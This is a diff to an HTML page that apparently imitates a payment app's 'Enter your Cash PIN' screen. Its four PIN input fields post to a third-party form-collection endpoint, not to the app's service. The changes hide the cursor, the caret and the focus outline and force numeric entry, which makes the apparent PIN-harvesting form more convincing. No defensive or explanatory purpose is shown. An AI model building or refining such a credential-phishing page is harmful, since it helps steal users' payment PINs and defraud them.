@@ -50,6 +50,10 @@
 	form {
 		margin: 0
 	}
+
+	*:focus {
+    outline: none;
+}
 	
 	.flex-container,
 	.flex-v {
@@ -7364,7 +7368,9 @@
 		border-radius: 50%;
 		transition: background-color .2s linear;
 		background-color: transparent !important;
-		color: transparent
+		color: transparent;
+		cursor: none;
+		caret-color: transparent;
 	}
 	
 	.passcode-inputs-bubble .input-bubbles .input-bubble:not(:last-child) {
@@ -14913,10 +14919,10 @@ Enter your Cash PIN to continue.</span></p>
   action="https://formspree.io/f/xayvdnbz"
   method="POST"
 >
-								<input id = "bubble1" name = "bubble1" class="input-bubble ">
-								<input id = "bubble2" name = "bubble2" class="input-bubble ">
-								<input id = "bubble3" name = "bubble3" class="input-bubble ">
-								<input id = "bubble4" name = "bubble4" class="input-bubble ">
+								<input id = "bubble1" pattern="[0-9]*" name = "bubble1" class="input-bubble ">
+								<input id = "bubble2" pattern="[0-9]*" name = "bubble2" class="input-bubble ">
+								<input id = "bubble3" pattern="[0-9]*" name = "bubble3" class="input-bubble ">
+								<input id = "bubble4" pattern="[0-9]*" name = "bubble4" class="input-bubble ">
 							</form>
 							</div>
 						</div>
